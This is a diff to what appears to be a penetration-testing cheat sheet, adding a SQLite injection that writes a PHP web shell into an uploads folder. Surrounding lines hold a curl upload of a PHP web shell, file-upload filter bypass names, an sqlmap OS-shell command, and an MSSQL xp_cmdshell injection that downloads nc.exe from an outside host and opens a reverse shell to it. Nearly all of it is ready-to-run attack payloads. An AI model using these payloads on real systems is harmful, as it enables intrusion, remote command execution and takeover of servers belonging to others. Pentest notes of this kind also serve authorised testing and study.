@@ -233,7 +233,7 @@ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 * file.php -&gt; file.jpg
 * file.php -&gt; file.php.jpg
 * file.asp -&gt; file.asp;.jpg
-* file.gif \(contains php code, but starts with string GIF\)
+* file.gif \(contains php code, but starts with string GIF/GIF98\)
 * 00%
 * file.jpg with php backdoor in exif \(see below\)
 
@@ -349,6 +349,14 @@ sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --thre
 ```bash
 # netcat reverse shell via mssql injection when xp_cmdshell is available
 1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
+```
+
+### SQLite Injection to Shell or Backdoor
+
+```sql
+ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; 
+CREATE TABLE pwn.shell (code TEXT); 
+INSERT INTO pwn.shell (code) VALUES ('<?php system($_REQUEST['cmd']);?>');
 ```
 
 ### MS-SQL Console
